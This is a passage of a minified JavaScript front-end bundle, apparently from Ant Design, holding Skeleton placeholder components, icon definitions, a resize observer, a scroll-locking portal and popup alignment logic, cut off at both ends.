50%"}}),tc=e=>({height:e,lineHeight:(0,S.unit)(e)}),tu=e=>({width:e,...tc(e)}),td=(e,t)=>({width:t(e).mul(5).equal(),minWidth:t(e).mul(5).equal(),...tc(e)}),tp=e=>{let{gradientFromColor:t,borderRadiusSM:r,imageSizeBase:o,calc:n}=e;return{display:"inline-flex",alignItems:"center",justifyContent:"center",verticalAlign:"middle",background:t,borderRadius:r,...tu(n(o).mul(2).equal())}},tm=(e,t,r)=>{let{skeletonButtonCls:o}=e;return{[`${r}${o}-circle`]:{width:t,minWidth:t,borderRadius:"50%"},[`${r}${o}-round`]:{borderRadius:t}}},tf=(e,t)=>({width:t(e).mul(2).equal(),minWidth:t(e).mul(2).equal(),...tc(e)}),tg=(0,x.genStyleHooks)("Skeleton",e=>{let{componentCls:t,calc:r}=e;return(e=>{let{componentCls:t,skeletonAvatarCls:r,skeletonTitleCls:o,skeletonParagraphCls:n,skeletonButtonCls:a,skeletonInputCls:i,skeletonNodeCls:s,skeletonImageCls:l,controlHeight:c,controlHeightLG:u,controlHeightSM:d,gradientFromColor:p,padding:m,marginSM:f,borderRadius:g,titleHeight:h,blockRadius:v,paragraphLiHeight:b,controlHeightXS:y,paragraphMarginTop:S}=e;return{[t]:{display:"table",width:"100%",[`${t}-header`]:{display:"table-cell",paddingInlineEnd:m,verticalAlign:"top",[r]:{display:"inline-block",verticalAlign:"top",background:p,...tu(c)},[`${r}-circle`]:{borderRadius:"50%"},[`${r}-lg`]:{...tu(u)},[`${r}-sm`]:{...tu(d)}},[`${t}-section`]:{display:"table-cell",width:"100%",verticalAlign:"top",[o]:{width:"100%",height:h,background:p,borderRadius:v,[`+ ${n}`]:{marginBlockStart:d}},[n]:{padding:0,"> li":{width:"100%",height:b,listStyle:"none",background:p,borderRadius:v,"+ li":{marginBlockStart:y}}},[`${n}> li:last-child:not(:first-child):not(:nth-child(2))`]:{width:"61%"}},[`&-round ${t}-section`]:{[`${o}, ${n} > li`]:{borderRadius:g}}},[`${t}-with-avatar ${t}-section`]:{[o]:{marginBlockStart:f,[`+ ${n}`]:{marginBlockStart:S}}},[`${t}${t}-element`]:{display:"inline-block",width:"auto",...(e=>{let{borderRadiusSM:t,skeletonButtonCls:r,controlHeight:o,controlHeightLG:n,controlHeightSM:a,gradientFromColor:i,calc:s}=e;return{[r]:{display:"inline-block",verticalAlign:"top",background:i,borderRadius:t,width:s(o).mul(2).equal(),minWidth:s(o).mul(2).equal(),...tf(o,s)},...tm(e,o,r),[`${r}-lg`]:{...tf(n,s)},...tm(e,n,`${r}-lg`),[`${r}-sm`]:{...tf(a,s)},...tm(e,a,`${r}-sm`)}})(e),...(e=>{let{skeletonAvatarCls:t,gradientFromColor:r,controlHeight:o,controlHeightLG:n,controlHeightSM:a}=e;return{[t]:{display:"inline-block",verticalAlign:"top",background:r,...tu(o)},[`${t}${t}-circle`]:{borderRadius:"50%"},[`${t}${t}-lg`]:{...tu(n)},[`${t}${t}-sm`]:{...tu(a)}}})(e),...(e=>{let{controlHeight:t,borderRadiusSM:r,skeletonInputCls:o,controlHeightLG:n,controlHeightSM:a,gradientFromColor:i,calc:s}=e;return{[o]:{display:"inline-block",verticalAlign:"top",background:i,borderRadius:r,...td(t,s)},[`${o}-lg`]:{...td(n,s)},[`${o}-sm`]:{...td(a,s)}}})(e),...{[e.skeletonNodeCls]:{...tp(e)}},...(e=>{let{skeletonImageCls:t,imageSizeBase:r,calc:o}=e;return{[t]:{...tp(e),[`${t}-path`]:{fill:"#bfbfbf"},[`${t}-svg`]:{...tu(r),maxWidth:o(r).mul(4).equal(),maxHeight:o(r).mul(4).equal()},[`${t}-svg${t}-svg-circle`]:{borderRadius:"50%"}},[`${t}${t}-circle`]:{borderRadius:"50%"}}})(e)},[`${t}${t}-block`]:{width:"100%",[a]:{width:"100%"},[i]:{width:"100%"}},[`${t}${t}-active`]:{[`
        ${o},
        ${n} > li,
        ${r},
        ${a},
        ${i},
        ${s},
        ${l}
      `]:{...{background:e.skeletonLoadingBackground,backgroundSize:"400% 100%",animationName:tl,animationDuration:e.skeletonLoadingMotionDuration,animationTimingFunction:"ease",animationIterationCount:"infinite"}}}}})((0,ts.mergeToken)(e,{skeletonAvatarCls:`${t}-avatar`,skeletonTitleCls:`${t}-title`,skeletonParagraphCls:`${t}-paragraph`,skeletonButtonCls:`${t}-button`,skeletonInputCls:`${t}-input`,skeletonNodeCls:`${t}-node`,skeletonImageCls:`${t}-image`,imageSizeBase:r(e.controlHeight).mul(1.5).equal(),borderRadius:100,skeletonLoadingBackground:`linear-gradient(90deg, ${e.gradientFromColor} 25%, ${e.gradientToColor} 37%, ${e.gradientFromColor} 63%)`,skeletonLoadingMotionDuration:"1.4s"}))},e=>{let{colorFillContent:t,colorFill:r}=e;return{color:t,colorGradientEnd:r,gradientFromColor:t,gradientToColor:r,titleHeight:e.controlHeight/2,blockRadius:e.borderRadiusSM,paragraphMarginTop:e.marginLG+e.marginXXS,paragraphLiHeight:e.controlHeight/2}},{deprecatedTokens:[["color","gradientFromColor"],["colorGradientEnd","gradientToColor"]]}),th=e=>{let{prefixCls:t,className:r,classNames:o,rootClassName:n,internalClassName:a,style:s,styles:u,active:d,children:p}=e,{getPrefixCls:m}=i.useContext(c.ConfigContext),f=m("skeleton",t),[g,h]=tg(f),v=(0,l.clsx)(f,`${f}-element`,{[`${f}-active`]:d},g,o?.root,r,n,h);return i.createElement("div",{className:v,style:u?.root},i.createElement("div",{className:(0,l.clsx)(o?.content,a||`${f}-node`),style:{...u?.content,...s}},p))},tv=e=>{let{prefixCls:t,className:r,style:o,rows:n=0}=e,a=Array.from({length:n}).map((t,r)=>i.createElement("li",{key:r,style:{width:((e,t)=>{let{width:r,rows:o=2}=t;return Array.isArray(r)?r[e]:o-1===e?r:void 0})(r,e)}}));return i.createElement("ul",{className:(0,l.clsx)(t,r),style:o},a)},tb=({prefixCls:e,className:t,width:r,style:o})=>i.createElement("h3",{className:(0,l.clsx)(e,t),style:{width:r,...o}});function ty(e){return e&&"object"==typeof e?e:{}}let tS=e=>{let{prefixCls:t,loading:r,className:o,rootClassName:n,classNames:a,style:s,styles:u,children:d,avatar:p=!1,title:m=!0,paragraph:f=!0,active:g,round:h}=e,{getPrefixCls:v,direction:b,className:y,style:S,classNames:x,styles:C}=(0,c.useComponentConfig)("skeleton"),w=v("skeleton",t),[k,P]=tg(w),$={...e,avatar:p,title:m,paragraph:f},[E,T]=(0,j.useMergeSemantic)([x,a],[C,u],{props:$});if(r||!("loading"in e)){let e,t,r=!!p,a=!!m,c=!!f;if(r){let t={className:E.avatar,prefixCls:`${w}-avatar`,...a&&!c?{size:"large",shape:"square"}:{size:"large",shape:"circle"},...ty(p),style:T.avatar};e=i.createElement("div",{className:(0,l.clsx)(E.header,`${w}-header`),style:T.header},i.createElement(ta,{...t}))}if(a||c){let e,o;if(a){let t={className:E.title,prefixCls:`${w}-title`,...!r&&c?{width:"38%"}:r&&c?{width:"50%"}:{},...ty(m),style:T.title};e=i.createElement(tb,{...t})}if(c){let e,t={className:E.paragraph,prefixCls:`${w}-paragraph`,...(e={},(!r||!a)&&(e.width="61%"),!r&&a?e.rows=3:e.rows=2,e),...ty(f),style:T.paragraph};o=i.createElement(tv,{...t})}t=i.createElement("div",{className:(0,l.clsx)(E.section,`${w}-section`),style:T.section},e,o)}let u=(0,l.clsx)(w,{[`${w}-with-avatar`]:r,[`${w}-active`]:g,[`${w}-rtl`]:"rtl"===b,[`${w}-round`]:h},E.root,y,o,n,k,P);return i.createElement("div",{className:u,style:{...T.root,...S,...s}},e,t)}return d??null};tS.Button=e=>{let{prefixCls:t,className:r,rootClassName:o,classNames:n,active:a,style:s,styles:u,block:d=!1,size:p,...m}=e,{getPrefixCls:f}=i.useContext(c.ConfigContext),g=f("skeleton",t),[h,v]=tg(g),b=(0,F.default)(e=>p??e),y=(0,l.clsx)(g,`${g}-element`,{[`${g}-active`]:a,[`${g}-block`]:d},n?.root,r,o,h,v);return i.createElement("div",{className:y,style:u?.root},i.createElement(ta,{prefixCls:`${g}-button`,className:n?.content,style:{...u?.content,...s},size:b,...m}))},tS.Avatar=e=>{let{prefixCls:t,className:r,classNames:o,rootClassName:n,active:a,style:s,styles:u,shape:d="circle",size:p,...m}=e,{getPrefixCls:f}=i.useContext(c.ConfigContext),g=f("skeleton",t),[h,v]=tg(g),b=(0,F.default)(e=>p??e),y=(0,l.clsx)(g,`${g}-element`,{[`${g}-active`]:a},o?.root,r,n,h,v);return i.createElement("div",{className:y,style:u?.root},i.createElement(ta,{prefixCls:`${g}-avatar`,className:o?.content,style:{...u?.content,...s},shape:d,size:b,...m}))},tS.Input=e=>{let{prefixCls:t,className:r,classNames:o,rootClassName:n,active:a,block:s,style:u,styles:d,size:p,...m}=e,{getPrefixCls:f}=i.useContext(c.ConfigContext),g=f("skeleton",t),[h,v]=tg(g),b=(0,F.default)(e=>p??e),y=(0,l.clsx)(g,`${g}-element`,{[`${g}-active`]:a,[`${g}-block`]:s},o?.root,r,n,h,v);return i.createElement("div",{className:y,style:d?.root},i.createElement(ta,{prefixCls:`${g}-input`,className:o?.content,style:{...d?.content,...u},size:b,...m}))},tS.Image=e=>{let{getPrefixCls:t}=i.useContext(c.ConfigContext),r=t("skeleton",e.prefixCls);return i.createElement(th,{...e,internalClassName:`${r}-image`},i.createElement("svg",{viewBox:"0 0 1098 1024",xmlns:"http://www.w3.org/2000/svg",className:`${r}-image-svg`},i.createElement("title",null,"Image placeholder"),i.createElement("path",{d:"M365.7 329.1q0 45.8-32 77.7t-77.7 32-77.7-32-32-77.7 32-77.6 77.7-32 77.7 32 32 77.6M951 548.6v256H146.3V694.9L329 512l91.5 91.4L713 311zm54.8-402.3H91.4q-7.4 0-12.8 5.4T73 164.6v694.8q0 7.5 5.5 12.9t12.8 5.4h914.3q7.5 0 12.9-5.4t5.4-12.9V164.6q0-7.5-5.4-12.9t-12.9-5.4m91.4 18.3v694.8q0 37.8-26.8 64.6t-64.6 26.9H91.4q-37.7 0-64.6-26.9T0 859.4V164.6q0-37.8 26.8-64.6T91.4 73h914.3q37.8 0 64.6 26.9t26.8 64.6",className:`${r}-image-path`})))},tS.Node=th;let tx={icon:{tag:"svg",attrs:{"fill-rule":"evenodd",viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M799.86 166.31c.02 0 .04.02.08.06l57.69 57.7c.04.03.05.05.06.08a.12.12 0 010 .06c0 .03-.02.05-.06.09L569.93 512l287.7 287.7c.04.04.05.06.06.09a.12.12 0 010 .07c0 .02-.02.04-.06.08l-57.7 57.69c-.03.04-.05.05-.07.06a.12.12 0 01-.07 0c-.03 0-.05-.02-.09-.06L512 569.93l-287.7 287.7c-.04.04-.06.05-.09.06a.12.12 0 01-.07 0c-.02 0-.04-.02-.08-.06l-57.69-57.7c-.04-.03-.05-.05-.06-.07a.12.12 0 010-.07c0-.03.02-.05.06-.09L454.07 512l-287.7-287.7c-.04-.04-.05-.06-.06-.09a.12.12 0 010-.07c0-.02.02-.04.06-.08l57.7-57.69c.03-.04.05-.05.07-.06a.12.12 0 01.07 0c.03 0 .05.02.09.06L512 454.07l287.7-287.7c.04-.04.06-.05.09-.06a.12.12 0 01.07 0z"}}]},name:"close",theme:"outlined"};function tC(){return(tC=Object.assign.bind()).apply(this,arguments)}let tw=i.forwardRef((e,t)=>i.createElement(m.default,tC({},e,{ref:t,icon:tx})));e.s(["default",0,tw],64517);let tk={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M176 511a56 56 0 10112 0 56 56 0 10-112 0zm280 0a56 56 0 10112 0 56 56 0 10-112 0zm280 0a56 56 0 10112 0 56 56 0 10-112 0z"}}]},name:"ellipsis",theme:"outlined"};function tP(){return(tP=Object.assign.bind()).apply(this,arguments)}let t$=i.forwardRef((e,t)=>i.createElement(m.default,tP({},e,{ref:t,icon:tk})));e.s(["default",0,t$],67384);let tE={icon:{tag:"svg",attrs:{viewBox:"64 64 896 896",focusable:"false"},children:[{tag:"path",attrs:{d:"M482 152h60q8 0 8 8v704q0 8-8 8h-60q-8 0-8-8V160q0-8 8-8z"}},{tag:"path",attrs:{d:"M192 474h672q8 0 8 8v60q0 8-8 8H160q-8 0-8-8v-60q0-8 8-8z"}}]},name:"plus",theme:"outlined"};function tT(){return(tT=Object.assign.bind()).apply(this,arguments)}let tI=i.forwardRef((e,t)=>i.createElement(m.default,tT({},e,{ref:t,icon:tE})));var tR=e.i(40383),tM=e.i(6584);let tA=(0,i.createContext)(null);var tD=e.i(46302),tL=e.i(32839);let t_=i.createContext(null),tO=new Map;function tj(e){e.forEach(e=>{let{target:t}=e;tO.get(t)?.forEach(e=>e(t))})}function tF(){return r||(r=new ResizeObserver(tj)),r}function tN(e,t,r,o){let n=i.useRef({width:-1,height:-1,offsetWidth:-1,offsetHeight:-1}),a=(0,e9.useEvent)(e=>{let{width:t,height:a}=e.getBoundingClientRect(),{offsetWidth:i,offsetHeight:s}=e,l=Math.floor(t),c=Math.floor(a);if(n.current.width!==l||n.current.height!==c||n.current.offsetWidth!==i||n.current.offsetHeight!==s){let u={width:l,height:c,offsetWidth:i,offsetHeight:s};n.current=u;let d=i===Math.round(t)?t:i,p=s===Math.round(a)?a:s,m={...u,offsetWidth:d,offsetHeight:p};o?.(m,e),Promise.resolve().then(()=>{r?.(m,e)})}}),s="function"==typeof t;i.useEffect(()=>{let r=s?t():t;return r&&e&&(tO.has(r)||(tO.set(r,new Set),tF().observe(r)),tO.get(r).add(a)),()=>{r&&tO.has(r)&&(tO.get(r).delete(a),tO.get(r).size||(tF().unobserve(r),tO.delete(r)))}},[e,s?0:t])}let tV=i.forwardRef(function(e,t){let{children:r,disabled:o,onResize:n,data:a}=e,s=i.useRef(null),l=i.useContext(t_),c="function"==typeof r,u=c?r(s):r,d=!c&&i.isValidElement(u)&&(0,tL.supportRef)(u),p=d?(0,tL.getNodeRef)(u):null,m=(0,tL.useComposeRef)(p,s),f=()=>(0,tD.getDOM)(s.current);return i.useImperativeHandle(t,()=>f()),tN(!o,f,n,(e,t)=>{l?.(e,t,a)}),d?i.cloneElement(u,{ref:m}):u});function tB(){return(tB=Object.assign.bind()).apply(this,arguments)}let tH=i.forwardRef(function(e,t){let{children:r}=e;return("function"==typeof r?[r]:(0,N.default)(r)).map((r,o)=>{let n=r?.key||`rc-observer-key-${o}`;return i.createElement(tV,tB({},e,{key:n,ref:0===o?t:void 0}),r)})});tH.Collection=function({children:e,onBatchResize:t}){let r=i.useRef(0),o=i.useRef([]),n=i.useContext(t_),a=i.useCallback((e,a,i)=>{r.current+=1;let s=r.current;o.current.push({size:e,element:a,data:i}),Promise.resolve().then(()=>{s===r.current&&(t?.(o.current),o.current=[])}),n?.(e,a,i)},[t,n]);return i.createElement(t_.Provider,{value:a},e)},e.s(["default",0,tH],78052);var tz=e.i(40487);let tU={width:0,height:0,left:0,top:0};function tW(e,t){let r=i.useRef(e),[,o]=i.useState({});return[r.current,function(e){let n="function"==typeof e?e(r.current):e;n!==r.current&&t(n,r.current),r.current=n,o({})}]}var tq=e.i(1676);function tG(e){let[t,r]=(0,i.useState)(0),o=(0,i.useRef)(0),n=(0,i.useRef)();return n.current=e,(0,tq.useLayoutUpdateEffect)(()=>{n.current?.()},[t]),()=>{o.current===t&&(o.current+=1,r(o.current))}}let tJ={width:0,height:0,left:0,top:0,right:0};function tX(e){let t;return e instanceof Map?(t={},e.forEach((e,r)=>{t[r]=e})):t=e,JSON.stringify(t)}function tK(e){return String(e).replace(/"/g,"TABS_DQ")}function tQ(e,t,r,o){return!!r&&!o&&!1!==e&&(void 0!==e||!1!==t&&null!==t)}let tY=i.forwardRef((e,t)=>{let{prefixCls:r,editable:o,locale:n,style:a}=e;return o&&!1!==o.showAdd?i.createElement("button",{ref:t,type:"button",className:`${r}-nav-add`,style:a,"aria-label":n?.addAriaLabel||"Add tab",onClick:e=>{o.onEdit("add",{event:e})}},o.addIcon||"+"):null}),tZ=i.forwardRef((e,t)=>{let r,{position:o,prefixCls:n,extra:a}=e;if(!a)return null;let s={};return"object"!=typeof a||i.isValidElement(a)?s.right=a:s=a,"right"===o&&(r=s.right),"left"===o&&(r=s.left),r?i.createElement("div",{className:`${n}-extra-content`,ref:t},r):null});var t0=e.i(32044),t1=e.i(74080);let t2=i.createContext(null),t3=[];var t4=e.i(78519);let t6=`rc-util-locker-${Date.now()}`,t5=0,t8=0,t7={...i}.useId,t9=t7?function(e){let t=t7();return e||t}:function(e){let[t,r]=i.useState("ssr-id");return(i.useEffect(()=>{let e=t8;t8+=1,r(`rc_unique_${e}`)},[]),e)?e:t};e.s(["default",0,t9],87225);let re=[],rt=0,rr=e=>{if("Escape"===e.key&&!e.isComposing){if(Date.now()-rt<200)return;let t=re.length;for(let r=t-1;r>=0;r-=1)re[r].onEsc({top:r===t-1,event:e})}},ro=()=>{rt=Date.now()},rn=e=>!1!==e&&((0,t0.default)()&&e?"string"==typeof e?document.querySelector(e):"function"==typeof e?e():e:null),ra=i.forwardRef((e,t)=>{let r,o,n,a,{open:s,autoLock:l,getContainer:c,debug:u,autoDestroy:d=!0,children:p,onEsc:m}=e,[f,g]=i.useState(s),h=f||s;i.useEffect(()=>{(d||s)&&g(s)},[s,d]);let[v,b]=i.useState(()=>rn(c));i.useEffect(()=>{let e=rn(c);b(()=>e??null)});let[y,S]=function(e,t){let[r]=i.useState(()=>(0,t0.default)()?document.createElement("div"):null),o=i.useRef(!1),n=i.useContext(t2),[a,s]=i.useState(t3),l=n||(o.current?void 0:e=>{s(t=>[e,...t])});function c(){r.parentElement||document.body.appendChild(r),o.current=!0}function u(){r.parentElement?.removeChild(r),o.current=!1}return(0,tq.default)(()=>(e?n?n(c):c():u(),u),[e]),(0,tq.default)(()=>{a.length&&(a.forEach(e=>e()),s(t3))},[a]),[r,l]}(h&&!v,0),x=v??y;!function(e){let t=!!e,[r]=i.useState(()=>(t5+=1,`${t6}_${t5}`));(0,tq.default)(()=>{if(t){var e;let t=(e=document.body,"u"<typeof document||!e||!(e instanceof Element)?{width:0,height:0}:function(e){let t,r,o=`rc-scrollbar-measure-${Math.random().toString(36).substring(7)}`,n=document.createElement("div");n.id=o;let a=n.style;if(a.position="absolute",a.left="0",a.top="0",a.width="100px",a.height="100px",a.overflow="scroll",e){let n=getComputedStyle(e);a.scrollbarColor=n.scrollbarColor,a.scrollbarWidth=n.scrollbarWidth;let i=getComputedStyle(e,"::-webkit-scrollbar"),s=parseInt(i.width,10),l=parseInt(i.height,10);try{let e=s?`width: ${i.width};`:"",t=l?`height: ${i.height};`:"";(0,t4.updateCSS)(`
#${o}::-webkit-scrollbar {
${e}
${t}
}`,o)}catch(e){console.error(e),t=s,r=l}}document.body.appendChild(n);let i=e&&t&&!isNaN(t)?t:n.offsetWidth-n.clientWidth,s=e&&r&&!isNaN(r)?r:n.offsetHeight-n.clientHeight;return document.body.removeChild(n),(0,t4.removeCSS)(o),{width:i,height:s}}(e)).width,o=document.body.scrollHeight>(window.innerHeight||document.documentElement.clientHeight)&&window.innerWidth>document.body.offsetWidth;(0,t4.updateCSS)(`
html body {
  overflow-y: hidden;
  ${o?`width: calc(100% - ${t}px);`:""}
}`,r)}else(0,t4.removeCSS)(r);return()=>{(0,t4.removeCSS)(r)}},[t,r])}(l&&s&&(0,t0.default)()&&(x===y||x===document.body)),r=t9(),o=(0,e9.useEvent)(m),n=()=>{re.find(e=>e.id===r)||re.push({id:r,onEsc:o})},a=()=>{re=re.filter(e=>e.id!==r)},(0,i.useMemo)(()=>{s?n():s||a()},[s]),(0,i.useEffect)(()=>{if(s)return n(),window.addEventListener("keydown",rr),window.addEventListener("compositionend",ro),()=>{a(),0===re.length&&(window.removeEventListener("keydown",rr),window.removeEventListener("compositionend",ro))}},[s]);let C=null;p&&(0,tL.supportRef)(p)&&t&&(C=(0,tL.getNodeRef)(p));let w=(0,tL.useComposeRef)(C,t);if(!h||!(0,t0.default)()||void 0===v)return null;let k=!1===x,P=p;return t&&(P=i.cloneElement(p,{ref:w})),i.createElement(t2.Provider,{value:S},k?P:(0,t1.createPortal)(P,x))});var ri=e.i(65783),rs=e.i(28473);function rl(e){let{prefixCls:t,align:r,arrow:o,arrowPos:n}=e,{className:a,content:s,style:c}=o||{},{x:u=0,y:d=0}=n,p=i.useRef(null);if(!r||!r.points)return null;let m={position:"absolute"};if(!1!==r.autoArrow){let e=r.points[0],t=r.points[1],o=e[0],n=e[1],a=t[0],i=t[1];o!==a&&["t","b"].includes(o)?"t"===o?m.top=0:m.bottom=0:m.top=d,n!==i&&["l","r"].includes(n)?"l"===n?m.left=0:m.right=0:m.left=u}return i.createElement("div",{ref:p,className:(0,l.clsx)(`${t}-arrow`,a),style:{...m,...c}},s)}function rc(){return(rc=Object.assign.bind()).apply(this,arguments)}function ru(e){let{prefixCls:t,open:r,zIndex:o,mask:n,motion:a,mobile:s}=e;return n?i.createElement(rs.default,rc({},a,{motionAppear:!0,visible:r,removeOnLeave:!0}),({className:e})=>i.createElement("div",{style:{zIndex:o},className:(0,l.clsx)(`${t}-mask`,s&&`${t}-mobile-mask`,e)})):null}let rd=i.memo(({children:e})=>e,(e,t)=>t.cache);function rp(e,t,r,o,n,a,i,s){let l="auto",c=e?{}:{left:"-1000vw",top:"-1000vh",right:l,bottom:l};if(!e&&(t||!r)){let{points:e}=o,t=o.dynamicInset||o._experimental?.dynamicInset,r=t&&"r"===e[0][1],u=t&&"b"===e[0][0];r?(c.right=n,c.left=l):(c.left=i,c.right=l),u?(c.bottom=a,c.top=l):(c.top=s,c.bottom=l)}return c}function rm(){return(rm=Object.assign.bind()).apply(this,arguments)}let rf=i.forwardRef((e,t)=>{let{onEsc:r,popup:o,className:n,prefixCls:a,style:s,target:c,onVisibleChanged:u,open:d,keepDom:p,fresh:m,onClick:f,mask:g,arrow:h,arrowPos:v,align:b,motion:y,maskMotion:S,mobile:x,forceRender:C,getPopupContainer:w,autoDestroy:k,portal:P,children:$,zIndex:E,onMouseEnter:T,onMouseLeave:I,onPointerEnter:R,onPointerDownCapture:M,ready:A,offsetX:D,offsetY:L,offsetR:_,offsetB:O,onAlign:j,onPrepare:F,onResize:N,stretch:V,targetWidth:B,targetHeight:H}=e,z="function"==typeof o?o():o,U=d||p,W=!!x,[q,G,J]=i.useMemo(()=>x?[x.mask,x.maskMotion,x.motion]:[g,S,y],[x,g,S,y]),X=w?.length>0,[K,Q]=i.useState(!w||!X);(0,tq.default)(()=>{!K&&X&&c&&Q(!0)},[K,X,c]);let Y=(0,e9.useEvent)((e,t)=>{N?.(e,t),j()}),Z=rp(W,A,d,b,_,O,D,L);if(!K)return null;let ee={};return V&&(V.includes("height")&&H?ee.height=H:V.includes("minHeight")&&H&&(ee.minHeight=H),V.includes("width")&&B?ee.width=B:V.includes("minWidth")&&B&&(ee.minWidth=B)),d||(ee.pointerEvents="none"),i.createElement(P,{open:C||U,getContainer:w&&(()=>w(c)),autoDestroy:k,onEsc:r},i.createElement(ru,{prefixCls:a,open:d,zIndex:E,mask:q,motion:G,mobile:W}),i.createElement(tH,{onResize:Y,disabled:!d},e=>i.createElement(rs.default,rm({motionAppear:!0,motionEnter:!0,motionLeave:!0,removeOnLeave:!1,forceRender:C,leavedClassName:`${a}-hidden`},J,{onAppearPrepare:F,onEnterPrepare:F,visible:d,onVisibleChanged:e=>{y?.onVisibleChanged?.(e),u(e)}}),({className:r,style:o},c)=>{let u=(0,l.clsx)(a,r,n,{[`${a}-mobile`]:W});return i.createElement("div",{ref:(0,tL.composeRef)(e,t,c),className:u,style:{"--arrow-x":`${v.x||0}px`,"--arrow-y":`${v.y||0}px`,...Z,...ee,...o,boxSizing:"border-box",zIndex:E,...s},onMouseEnter:T,onMouseLeave:I,onPointerEnter:R,onClick:f,onPointerDownCapture:M},h&&i.createElement(rl,{prefixCls:a,arrow:h,arrowPos:v,align:b}),i.createElement(rd,{cache:!d&&!m},z))})),$)}),rg=i.createContext(null),rh=i.createContext(null);function rv(e){return e?Array.isArray(e)?e:[e]:[]}var rb=e.i(43022);function ry(e,t,r,o){let{points:n}=r,a=Object.keys(e);for(let r=0;r<a.length;r+=1){let i=a[r];if(function(e=[],t=[],r){let o=(e,t)=>e[t]||"";return r?o(e,0)===o(t,0):o(e,0)===o(t,0)&&o(e,1)===o(t,1)}(e[i]?.points,n,o))return`${t}-placement-${i}`}return""}function rS(e){return e.ownerDocument.defaultView}function rx(e){let t=[],r=e?.parentElement,o=["hidden","scroll","clip","auto"];for(;r;){let{overflowX:e,overflowY:n,overflow:a}=rS(r).getComputedStyle(r);[e,n,a].some(e=>o.includes(e))&&t.push(r),r=r.parentElement}return t}function rC(e,t=1){return Number.isNaN(e)?t:e}function rw(e){return rC(parseFloat(e),0)}function rk(e,t){let r={...e};return(t||[]).forEach(e=>{if(e instanceof HTMLBodyElement||e instanceof HTMLHtmlElement)return;let{overflow:t,overflowClipMargin:o,borderTopWidth:n,borderBottomWidth:a,borderLeftWidth:i,borderRightWidth:s}=rS(e).getComputedStyle(e),l=e.getBoundingClientRect(),{offsetHeight:c,clientHeight:u,offsetWidth:d,clientWidth:p}=e,m=rw(n),f=rw(a),g=rw(i),h=rw(s),v=rC(Math.round(l.width/d*1e3)/1e3),b=rC(Math.round(l.height/c*1e3)/1e3),y=m*b,S=g*v,x=0,C=0;if("clip"===t){let e=rw(o);x=e*v,C=e*b}let w=l.x+S-x,k=l.y+y-C,P=w+l.width+2*x-S-h*v-(d-p-g-h)*v,$=k+l.height+2*C-y-f*b-(c-u-m-f)*b;r.left=Math.max(r.left,w),r.top=Math.max(r.top,k),r.right=Math.min(r.right,P),r.bottom=Math.min(r.bottom,$)}),r}function rP(e,t=0){let r=`${t}`,o=r.match(/^(.*)\%$/);return o?e*(parseFloat(o[1])/100):parseFloat(r)}function r$(e,t){let[r,o]=t||[];return[rP(e.width,r),rP(e.height,o)]}function rE(e=""){return[e[0],e[1]]}function rT(e,t){let r,o=t[0],n=t[1];return r="t"===o?e.y:"b"===o?e.y+e.height:e.y+e.height/2,{x:"l"===n?e.x:"r"===n?e.x+e.width:e.x+e.width/2,y:r}}function rI(e,t){let r=[...e];return r[t]=({t:"b",b:"t",l:"r",r:"l"})[e[t]]||"c",r}function rR(e,t,r,o,n,a,s,l){let[c,u]=i.useState({ready:!1,offsetX:0,offsetY:0,offsetR:0,offsetB:0,arrowX:0,arrowY:0,scaleX:1,scaleY:1,align:n[o]||{}}),d=i.useRef(0),p=i.useMemo(()=>!t||l?[]:rx(t),[t]),m=i.useRef({});e||(m.current={});let f=(0,tz.default)(()=>{if(t&&r&&e&&!l){let e,l,d,f,g,h=t.ownerDocument,v=rS(t),{position:b}=v.getComputedStyle(t),y=t.style.left,S=t.style.top,x=t.style.right,C=t.style.bottom,w=t.style.overflow,k={...n[o],...a},P=h.createElement("div");if(t.parentElement?.appendChild(P),P.style.left=`${t.offsetLeft}px`,P.style.top=`${t.offsetTop}px`,P.style.position=b,P.style.height=`${t.offsetHeight}px`,P.style.width=`${t.offsetWidth}px`,t.style.left="0",t.style.top="0",t.style.right="auto",t.style.bottom="auto",t.style.overflow="hidden",Array.isArray(r))e={x:r[0],y:r[1],width:0,height:0};else{let t=r.getBoundingClientRect();t.x=t.x??t.left,t.y=t.y??t.top,e={x:t.x,y:t.y,width:t.width,height:t.height}}let $=t.getBoundingClientRect(),{height:E,width:T}=v.getComputedStyle(t);$.x=$.x??$.left,$.y=$.y??$.top;let{clientWidth:I,clientHeight:R,scrollWidth:M,scrollHeight:A,scrollTop:D,scrollLeft:L}=h.documentElement,_=$.height,O=$.width,j=e.height,F=e.width,{htmlRegion:N}=k,V="visible",B="visibleFirst";"scroll"!==N&&N!==B&&(N=V);let H=N===B,z=rk({left:-L,top:-D,right:M-L,bottom:A-D},p),U=rk({left:0,top:0,right:I,bottom:R},p),W=N===V?U:z,q=H?U:W;t.style.left="auto",t.style.top="auto",t.style.right="0",t.style.bottom="0";let G=t.getBoundingClientRect();t.style.left=y,t.style.top=S,t.style.right=x,t.style.bottom=C,t.style.overflow=w,t.parentElement?.removeChild(P);let J=rC(Math.round(O/parseFloat(T)*1e3)/1e3),X=rC(Math.round(_/parseFloat(E)*1e3)/1e3);if(0===J||0===X||(0,tD.isDOM)(r)&&!(0,rb.default)(r))return;let{offset:K,targetOffset:Q}=k,[Y,Z]=r$($,K),[ee,et]=r$(e,Q);e.x-=ee,e.y-=et;let[er,eo]=k.points||[],en=rE(eo),ea=rE(er),ei=rT(e,en),es=rT($,ea),el={...k},ec=[ea,en],eu=ei.x-es.x+Y,ed=ei.y-es.y+Z;function i(e,t,r=W){let o=$.x+e,n=$.y+t,a=Math.max(o,r.left),s=Math.max(n,r.top);return Math.max(0,(Math.min(o+O,r.right)-a)*(Math.min(n+_,r.bottom)-s))}let ep=i(eu,ed),em=i(eu,ed,U),ef=rT(e,["t","l"]),eg=rT($,["t","l"]),eh=rT(e,["b","r"]),ev=rT($,["b","r"]),{adjustX:eb,adjustY:ey,shiftX:eS,shiftY:ex}=k.overflow||{},eC=e=>"boolean"==typeof e?e:e>=0;function c(){d=(l=$.y+ed)+_,g=(f=$.x+eu)+O}c();let ew=eC(ey),ek=ea[0]===en[0];if(ew&&"t"===ea[0]&&(d>q.bottom||m.current.bt)){let e=ed;ek?e-=_-j:e=ef.y-ev.y-Z;let t=i(eu,e),r=i(eu,e,U);t>ep||t===ep&&(!H||r>=em)?(m.current.bt=!0,ed=e,Z=-Z,ec=[rI(ec[0],0),rI(ec[1],0)]):m.current.bt=!1}if(ew&&"b"===ea[0]&&(l<q.top||m.current.tb)){let 